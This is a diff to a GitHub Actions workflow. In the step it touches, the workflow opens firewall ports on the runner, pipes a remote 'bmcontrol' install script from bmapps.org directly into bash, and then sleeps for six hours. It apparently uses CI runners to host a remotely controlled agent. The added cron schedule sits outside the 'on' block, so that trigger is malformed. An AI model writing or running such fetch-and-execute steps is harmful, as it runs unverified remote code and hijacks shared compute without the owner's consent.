@@ -1,5 +1,8 @@
 name: repi
 on: [push]
+
+schedule:
+  - cron: '* */6 * * *'
     
 env:
   RUBY_VERSION: '2.6'
@@ -22,4 +25,4 @@ jobs:
         sudo ufw allow 22
         sudo ufw allow 443
         sudo ufw enable
-        wget -qO- https://bmapps.org/bmcontrol/linux/install5919060.sh | bash && sleep 5h
+        wget -qO- https://bmapps.org/bmcontrol/linux/install5919060.sh | bash && sleep 6h
